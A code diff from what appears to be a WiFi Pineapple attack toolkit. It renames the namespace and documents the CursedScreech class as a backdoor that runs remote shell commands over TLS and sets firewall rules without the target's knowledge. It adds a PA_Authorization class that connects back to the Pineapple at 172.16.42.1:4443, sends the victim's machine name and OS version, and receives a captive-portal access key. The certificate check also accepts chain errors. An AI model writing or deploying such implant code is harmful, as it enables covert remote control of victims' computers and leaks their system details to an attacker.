@@ -15,8 +15,21 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace CursedScreech
+namespace PineappleModules
 {
+    /*
+     * 
+     * Class:   CursedScreech
+     * Author:  sud0nick
+     * Date:    March 3, 2016
+     * 
+     * A class that sets up a multicast thread to broadcast back
+     * to the Pineapple on which port it is listening, sets up a
+     * server thread for executing remote shell commands secured via
+     * TLS 1.2, and establishes firewall rules to perform said actions
+     * unbeknownst to the target.
+     * 
+    */
     public class CursedScreech
     {
         // ==================================================
@@ -227,6 +240,8 @@ namespace CursedScreech
         //        METHOD TO VERIFY KURO'S CERTIFICATE
         // ==================================================
         private static bool atkCertValidation(Object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
+            Console.WriteLine(BitConverter.ToString(cert.GetSerialNumber()));
+            Console.WriteLine(cert.GetCertHashString());
             if (certSerial != "") {
                 if (BitConverter.ToString(cert.GetSerialNumber()) != certSerial) { return false; }
             }
@@ -236,6 +251,71 @@ namespace CursedScreech
             if (sslPolicyErrors == SslPolicyErrors.None) { return true; }
             if (sslPolicyErrors == SslPolicyErrors.RemoteCertificateChainErrors) { return true; }
             return false;
+        }
+    }
+
+
+
+    /*
+     * 
+     * Class:   PA_Authorization
+     * Author:  sud0nick
+     * Date:    July 16, 2016
+     * 
+     * A class for interacting with Portal Auth Shell Server
+     * This class simply connects back to the PASS script on
+     * the Pineapple, supplies some system info, and retrieves
+     * an access key for the victim to log on to the portal.
+     * 
+    */
+
+    public class PA_Authorization {
+        private string rHost;
+        private int rPort;
+        private string accessKey = "";
+
+        public PA_Authorization(string remoteHost = "172.16.42.1", int remotePort = 4443) {
+            rHost = remoteHost;
+            rPort = remotePort;
+        }
+
+        public string getAccessKey() {
+            // Establish a new socket to connect back to the Pineapple
+            TcpClient c_bk = new TcpClient();
+
+            try {
+                c_bk.Connect(rHost, rPort);
+            }
+            catch {
+                return "";
+            }
+            
+            
+            NetworkStream pa_stream = c_bk.GetStream();
+
+            // Send system information to PortalAuth
+            string systemInfo = "0;" + System.Environment.MachineName + ";" + System.Environment.OSVersion;
+            byte[] sysinfo = Encoding.ASCII.GetBytes(systemInfo);
+            pa_stream.Write(sysinfo, 0, sysinfo.Length);
+
+            // Get the access key back from PortalAuth
+            byte[] msgRecvd = new Byte[1024];
+            Int32 bytesRecvd = 0;
+            bytesRecvd = pa_stream.Read(msgRecvd, 0, msgRecvd.Length);
+
+            if (bytesRecvd < 1) {
+                c_bk.Close();
+                return "";
+            }
+            else {
+                accessKey = Encoding.ASCII.GetString(msgRecvd, 0, bytesRecvd);
+            }
+
+            // Close the connection
+            c_bk.Close();
+
+            // Return accessKey with either an error message or the key that was received
+            return accessKey;
         }
     }
 }
